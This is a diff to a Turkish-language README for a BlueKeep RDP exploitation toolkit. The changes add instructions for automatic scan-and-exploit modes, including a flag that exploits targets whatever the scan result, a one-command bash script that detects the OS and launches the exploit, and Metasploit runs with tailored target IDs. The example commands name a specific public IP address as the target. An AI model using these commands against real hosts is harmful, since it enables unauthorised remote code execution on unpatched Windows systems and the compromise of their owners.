@@ -83,6 +83,23 @@ Bir IP listesini taramak için:
 python3 bluekeep_scanner.py -f ip_listesi.txt
 ```
 
+#### Otomatik Exploit Seçenekleri
+
+Tarama ve otomatik exploit için:
+```bash
+python3 bluekeep_scanner.py -i HEDEF_IP -a
+```
+
+Tüm hedefleri tarama sonucuna bakılmaksızın exploitlemeyi denemek için:
+```bash
+python3 bluekeep_scanner.py -i HEDEF_IP -x
+```
+
+Başka bir yaklaşım olarak, bash script ile tek komutta tarama, işletim sistemi tespiti ve exploit:
+```bash
+./auto_bluekeep.sh HEDEF_IP
+```
+
 ### Proof of Concept (PoC)
 
 PoC modunu çalıştırmak için:
@@ -109,14 +126,26 @@ Parametreler:
 
 ### Metasploit ile Sömürü
 
-#### Otomatik OS Tespiti
-İşletim sistemi tespiti yaparak otomatik TARGET ID belirleme:
+#### Otomatik OS Tespiti ve Exploit
+İşletim sistemi tespiti yaparak en uygun TARGET ID değeriyle exploit:
 ```bash
 python3 metasploit_bluekeep.py -i HEDEF_IP -A
 ```
 
-Bu parametre hedefin işletim sistemini tespit ederek (Windows 7 SP1, Windows 7 SP0, Windows Server 2008 R2 vb.) 
-en uygun TARGET ID değerini belirleyecektir.
+Bu özellik:
+1. Hedef sistemin RDP özelliklerini kullanarak işletim sistemi sürümünü tespit eder
+2. Windows 7 SP1, Windows 7 SP0, Windows Server 2008 R2 gibi sistemler için özel TARGET değerlerini belirler
+3. Server 2008 sistemleri için gereken fDisableCam=0 ayarı hakkında uyarı verir
+4. Tespit edilen işletim sistemine göre uygun TARGET ID ile exploit başlatır
+
+Örnek kullanım:
+```bash
+# İşletim sistemi tespiti ve exploit
+python3 metasploit_bluekeep.py -i 175.200.128.148 -A
+
+# Tarama, işletim sistemi tespiti ve exploit (tek komut)
+python3 bluekeep_scanner.py -i 175.200.128.148 -a
+```
 
 #### Automatic Runner
 ```bash
@@ -199,6 +228,17 @@ python3 check_target.py -i HEDEF_IP -p 3389
    ```
 
 ## Ek Araçlar
+
+### Bash Script ile Otomatik Tarama ve Exploit
+```bash
+./auto_bluekeep.sh HEDEF_IP [PORT]
+```
+
+Bu script:
+1. Hedef sistemin RDP portunu kontrol eder
+2. BlueKeep zafiyeti için tarama yapar
+3. İşletim sistemini otomatik tespit eder
+4. Uygun TARGET ID ile exploit başlatır
 
 ### Local Test Environment
 ```bash
